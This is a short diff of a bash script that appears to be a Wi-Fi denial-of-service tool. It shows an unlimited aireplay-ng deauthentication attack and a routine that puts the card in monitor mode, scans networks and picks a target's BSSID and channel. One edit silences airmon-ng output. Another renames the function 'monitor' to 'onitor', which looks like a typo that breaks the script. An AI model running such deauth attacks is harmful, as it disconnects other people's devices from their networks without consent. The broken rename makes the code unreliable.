@@ -431,7 +431,7 @@ echo -e "[${Green}DoS${White}] Press ctrl+c to stop attack & exit..."
 aireplay-ng --deauth 0 -a $bssid $foo > /dev/null
 }
 
-monitor () {        ##### Monitor mode, scan available networks & select target #####
+onitor () {        ##### Monitor mode, scan available networks & select target #####
 spinner &
 airmon-ng start $foo > /dev/null 2>&1 
 trap "airmon-ng stop $foo > /dev/null;rm generated-01.kismet.csv 2> /dev/null" EXIT 
@@ -446,7 +446,7 @@ while [ ${targetNumber} -gt `wc -l generated-01.kismet.csv | cut -d " " -f 1` ] 
 echo -e "\n${Green}┌─[${Red}Select Target${Green}]──[${Red}~${Green}]─[${Yellow}Network${Green}]:"
 read -p "└─────►$(tput setaf 7) " targetNumber
 done
-airmon-ng start $foo
+airmon-ng start $foo > /dev/null 2>&1 
 targetName=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 3 `
 bssid=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 4 `
 channel=`sed -n "${targetNumber}p" < generated-01.kismet.csv | cut -d ";" -f 6 `
